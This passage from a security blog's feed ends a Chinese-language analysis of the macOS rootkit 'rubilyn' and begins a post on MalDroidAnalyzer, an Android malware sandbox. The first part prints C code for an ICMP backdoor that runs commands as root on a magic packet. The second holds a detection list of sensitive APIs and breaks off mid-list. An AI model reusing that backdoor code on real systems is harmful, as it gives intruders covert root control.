org_write_nocancel(p,uap,retval);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5、设置ICMP 后门&lt;/p&gt;
&lt;p&gt;首先添加IPv4过滤器ip_filter_ipv4：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;/* install IPv4 filter hook */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; ipf_addv4(&amp;amp;ip_filter_ipv4, &amp;amp;ip_filter_ipv4_ref);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ip_filter_ipv4结构如下：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; ipf_filter ip_filter_ipv4 = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.name		= &lt;span class=&quot;string&quot;&gt;&quot;rubilyn&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.ipf_input	= ipf_input,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.ipf_output	= ipf_output,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	.ipf_detach	= ipf_detach,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当传给用户的ICMP数据包中包含有以下特定数据时就以root权限执行命令：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* ICMP backdoor configuration */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_TYPE 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_CODE 255 &lt;span class=&quot;comment&quot;&gt;/* xor&#39;d magic word*/&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_STR &lt;span class=&quot;string&quot;&gt;&quot;\x27\x10\x3\xb\x46\x8\x1c\x10\x1e&quot;&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;// 解密后为“n0mn0mn0m”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAGIC_ICMP_STR_LEN 9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ipf_input主要处理传给用户的数据：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; errno_t &lt;span class=&quot;title&quot;&gt;ipf_input&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;* cookie, mbuf_t *data, &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; offset, u_int8_t protocol)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buf[IP_BUF_SIZE];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; icmp *icmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!(data &amp;amp;&amp;amp; *data))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (protocol != IPPROTO_ICMP)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    mbuf_copydata(*data, offset, IP_BUF_SIZE, buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    icmp = (struct icmp *)&amp;amp;buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// 检测接收的icmp数据包中是否包含后门的特征数据，若是则调用KUNCExecute函数执行命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(icmp-&amp;gt;icmp_type==MAGIC_ICMP_TYPE&amp;amp;&amp;amp;icmp-&amp;gt;icmp_code== MAGIC_ICMP_CODE &amp;amp;&amp;amp; &lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(icmp-&amp;gt;icmp_data, icmpstr, MAGIC_ICMP_STR_LEN)==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        my_KUNCExecute((char*)&amp;amp;k_cmd, kOpenAppAsRoot, kOpenApplicationPath);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;rubilyn还有个命令行控制台rubilyncon，通过输入参数选项来执行上面某项功能，主要都是通过sysctl控制内核变量来招待相应函数，这些内核变量都是在rubilyn中用sysctl注册的，通过这些内核变量可从用户层直接与rubilyn内核扩展进行交互来执行恶意操作。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、隐藏进程&quot;&gt;&lt;a href=&quot;#1、隐藏进程&quot; class=&quot;headerlink&quot; title=&quot;1、隐藏进程&quot;&gt;&lt;/a&gt;1、隐藏进程&lt;/h3&gt;&lt;p&gt;在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="OSX" scheme="http://riusksk.github.io/tags/OSX/"/>
    
      <category term="rootkit" scheme="http://riusksk.github.io/tags/rootkit/"/>
    
  </entry>
  
  <entry>
    <title>Android恶意软件沙盒自动化分析原理与实现</title>
    <link href="http://riusksk.github.io/2012/10/02/android_malware_sandbox/"/>
    <id>http://riusksk.github.io/2012/10/02/android_malware_sandbox/</id>
    <published>2012-10-01T16:00:00.000Z</published>
    <updated>2016-06-20T10:16:00.000Z</updated>
    
    <content type="html">&lt;p&gt;【作者】：riusksk（泉哥）&lt;br&gt;【团队】：腾讯安全应急响应中心&lt;br&gt;【日期】：2012年10月2日&lt;/p&gt;
&lt;h3 id=&quot;一、-前言&quot;&gt;&lt;a href=&quot;#一、-前言&quot; class=&quot;headerlink&quot; title=&quot;一、    前言&quot;&gt;&lt;/a&gt;一、    前言&lt;/h3&gt;&lt;p&gt;据网秦发布的《2012年上半年全球手机安全报告》，2012年上半年Android病毒感染量增长迅猛，尤以5、6月最为突出，上半年感染手机1283万部，比2011年下半年增长62%。在全球范围内，中国大陆地区被感染率占居首位。面对增长如此迅速的Android软件，安全研究人员常常需要逆向分析样本，分析出其恶意行为，但手工分析较费时间。在DEX文件反混淆技术的不遍推广和普及下，比如今年的BlackHat就有DEX反混淆的专题及相应工具公布，现在已有很多恶意软件使用到这些反混淆技术，这就加大了样本分析的难度及所花费的时间。本文主要讲述如何利用Android沙盘实现自动化分析恶意软件的方法，其中介绍了Android沙盘的原理，以及由笔者编写的Android沙盘——MalDroidAnalyzer，后面会提供由MalDroidAnalyzer分析真实病毒时自动生成的分析报告。&lt;/p&gt;
&lt;h3 id=&quot;二、-Android常见恶意软件行为&quot;&gt;&lt;a href=&quot;#二、-Android常见恶意软件行为&quot; class=&quot;headerlink&quot; title=&quot;二、    Android常见恶意软件行为&quot;&gt;&lt;/a&gt;二、    Android常见恶意软件行为&lt;/h3&gt;&lt;h4 id=&quot;1、-恶意扣费&quot;&gt;&lt;a href=&quot;#1、-恶意扣费&quot; class=&quot;headerlink&quot; title=&quot;1、    恶意扣费&quot;&gt;&lt;/a&gt;1、    恶意扣费&lt;/h4&gt;&lt;p&gt;病毒在后台发送扣费短信、拔打电话进行恶意扣费，同时会对服务商发回的服务短信进行屏蔽，破坏系统的正常功能，同时对用户造成资费损失。&lt;/p&gt;
&lt;h4 id=&quot;2、隐私窃取&quot;&gt;&lt;a href=&quot;#2、隐私窃取&quot; class=&quot;headerlink&quot; title=&quot;2、隐私窃取&quot;&gt;&lt;/a&gt;2、隐私窃取&lt;/h4&gt;&lt;p&gt;病毒通过后台服务窃取用户隐私信息，包括通话录音、短信内容、IMEI、IMSI、地理位置、通讯录、浏览器历史记录等信息，然后上传到黑客控制的远程服务器。&lt;/p&gt;
&lt;h4 id=&quot;3、远程控制&quot;&gt;&lt;a href=&quot;#3、远程控制&quot; class=&quot;headerlink&quot; title=&quot;3、远程控制&quot;&gt;&lt;/a&gt;3、远程控制&lt;/h4&gt;&lt;p&gt;病毒在后台开机自动，并与C&amp;amp;C服务器进行通讯，并从中获取加密的指令，解密后执行相应的恶意操作，也有通过SMS进行控制，构造出botnet，从而大规模地远程控制用户的手机。比如之前著名的AnserverBot病毒，就是通过新浪博客进行远程控制，也是首个利用第三方站点作为C&amp;amp;C服务器的Android病毒。&lt;/p&gt;
&lt;h4 id=&quot;4、系统破坏&quot;&gt;&lt;a href=&quot;#4、系统破坏&quot; class=&quot;headerlink&quot; title=&quot;4、系统破坏&quot;&gt;&lt;/a&gt;4、系统破坏&lt;/h4&gt;&lt;p&gt;病毒通过系统漏洞进行ROOT提权，并执行高权限操作，在后台静默安装子程序包，或者通过伪造成杀毒软件、提示更新等方式欺骗用户安装第三方恶意程序。病毒可能会更改网络状态、APN，或者替换系统文件、添加恶意书签、屏蔽运营商短信、中止杀软进程等方式进行系统破坏。&lt;/p&gt;
&lt;h4 id=&quot;5、其它&quot;&gt;&lt;a href=&quot;#5、其它&quot; class=&quot;headerlink&quot; title=&quot;5、其它&quot;&gt;&lt;/a&gt;5、其它&lt;/h4&gt;&lt;p&gt;病毒在后台联网下载大量软件，消耗用户手机流量，或者执行一些比较耗电的操作来消耗手机电量，进而影响正常的手机通信。也有些一些病毒通过钓鱼欺骗等方式，诱骗用户下载伪装软件，导致帐户密码失窃。&lt;/p&gt;
&lt;h3 id=&quot;三、-Android沙盘原理&quot;&gt;&lt;a href=&quot;#三、-Android沙盘原理&quot; class=&quot;headerlink&quot; title=&quot;三、    Android沙盘原理&quot;&gt;&lt;/a&gt;三、    Android沙盘原理&lt;/h3&gt;&lt;p&gt;本文主要介绍一款Android恶意软件行为自动分析平台——MalDroidAnalyzer，其主要结合静态分析和动态分析技术来实现恶意软件行为自动化分析。MalDroidAnalyzer是笔者使用Perl语言编写的，用于辅助分析Android软件行为，提高恶意软件的分析效率。&lt;/p&gt;
&lt;p&gt;首先，MalDroidAnalyzer直接以apk文件作为输入，整个分析过程主要分析两部分：静态分析和动态分析。静态分析会通过反编译apk文件，分析其中的权限、组件、敏感函数等信息，这些可以弥补动态分析中因未触发恶意行为而漏掉的行为。动态分析主要通过在模拟器运行Android软件，然后再对软件进行一些操作以触发尽可能多的恶意行为，接着输出到log中，再通过脚本对日志进行分析。由于Android系统默认情况下，一些输出日志里面缺乏我们所需的信息，比如发送短信时，只在log中记录手机号，而没有短信内容，此时就需要通过修改Android源码或者反汇编system.img中的相关类或者库进行修改，可以在短信发送函数sendTextMessage（位于system.img中的framework/framework.jar）里面添加短信内容的日志输出：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;下面是可能需要修改的相关文件，包括源码位置和编译后所对应的相关文件，可根据自身需要进行修改：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;发送短信：android.telephony.SmsManager（system.img中的framework/framework.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;文件操作：org.apache.harmony.luni.platform.OSFileSystem（system.img中的framework/core.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;网络操作：org.apache.harmony.luni.platform.OSNetworkSystem（system.img中的framework/core.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;拔打电话：android.app.Activity（system.img中的framework/framework.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;启动服务：android.content.ContextWrapper（system.img中的framework/framework.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;数据加解密：javax.crypto.Cipher（system.img中的framework/core.jar）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;核心库：dalvik/vm/native（system.img中的lib/libdvm.so）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于apk文件及MalDroidAnalyzer的工作流程如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/2.png&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;h4 id=&quot;1、静态分析&quot;&gt;&lt;a href=&quot;#1、静态分析&quot; class=&quot;headerlink&quot; title=&quot;1、静态分析&quot;&gt;&lt;/a&gt;1、静态分析&lt;/h4&gt;&lt;p&gt;沙盘MalDroidAnalyzer主要在电脑端对APK进行静态分析，通过apktool先进行反编译处理。正常的APK文件主要是以zip格式进行压缩捆绑的文档，里面主要包含AndroidManifest.xml、Classes.dex和res等文件。在反编译后会得到明文的AndroidManifest.xml，里面定义各组件、组件权限和启动位置、软件基本信息等，通过对该xml文件的分析，可以获取到软件名称、包名等基本信息，同时对包含的各个组件进行分析，特别是Broadcast Receiver组件的触发条件，可能就包含有开机自启动项用于启动后台服务，这些在报告中都会被高亮显示出来。&lt;/p&gt;
&lt;p&gt;在动态分析过程中，可能由于恶意行为的时间限制，或者模拟器的功能限制（比如蓝牙、Wifi），导致病毒的一些恶意行为无法触发。此时，我们通过检测Android软件调用的API函数可弥补这里的不足，比如发送扣费短信通常会调用sendTextMessage()函数，执行外部命令可能会调用java.lang.Runtime.exec()。下面是笔者收集整理的一些敏感API函数列表，欢迎各位读者补充和改进：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;my %apis = (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;IActivityManager\$Stub\$Proxy\;\-\&amp;gt;shutdown&amp;quot; =&amp;gt; &amp;apos;关机&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;ActivityManager\;\-\&amp;gt;killBackgroundProcesses&amp;quot; =&amp;gt; &amp;apos;中断进程，可用于关闭杀软&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;ActivityManagerNative;-&amp;gt;killBackgroundProcesses&amp;apos; =&amp;gt; &amp;apos;中断进程，可用于关闭杀软&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;ActivityManagerNative;-&amp;gt;restartPackage&amp;apos; =&amp;gt; &amp;apos; 中断进程，可用于关闭杀软&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;ActivityManager;-&amp;gt;restartPackage&amp;apos; =&amp;gt; &amp;apos; 中断进程，可用于关闭杀软&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;BluetoothAdapter\;\-\&amp;gt;enable&amp;quot; =&amp;gt; &amp;apos;开启蓝牙&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;BluetoothSocket\;\-\&amp;gt;connect&amp;quot; =&amp;gt; &amp;apos;连接蓝牙&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;IBluetoothPbap\$Stub\$Proxy\;\-\&amp;gt;connect&amp;quot; =&amp;gt; &amp;apos;连接蓝牙&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;ContentResolver\;\-\&amp;gt;query&amp;quot; =&amp;gt; &amp;apos;读取联系人、短信等数据库&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;ContentService\;\-\&amp;gt;dump&amp;quot; =&amp;gt; &amp;apos;转储联系人、短信等信息&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;PackageManager\;\-\&amp;gt;installPackage&amp;quot; =&amp;gt; &amp;apos;安装apk包&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Camera\;\-\&amp;gt;open&amp;quot; =&amp;gt; &amp;apos;开启相机&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;MediaRecorder\;\-\&amp;gt;setAudioSource&amp;quot; =&amp;gt; &amp;apos;开启录音功能&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;MediaRecorder\;\-\&amp;gt;setVideoSource&amp;quot; =&amp;gt; &amp;apos;开启视频录制&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;LocationManager\;\-\&amp;gt;getLastKnownLocation&amp;quot; =&amp;gt; &amp;apos;获取地址位置&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Downloads\$ByUri\;\-\&amp;gt;startDownloadByUri&amp;quot; =&amp;gt; &amp;apos;下载文件&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Downloads\$DownloadBase\;\-\&amp;gt;startDownloadByUri&amp;quot; =&amp;gt; &amp;apos;下载文件&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;PowerManager\;\-\&amp;gt;reboot&amp;quot; =&amp;gt; &amp;apos;重启手机&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Settings\$Bookmarks\;\-\&amp;gt;add&amp;quot; =&amp;gt; &amp;apos;添加浏览器书签&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	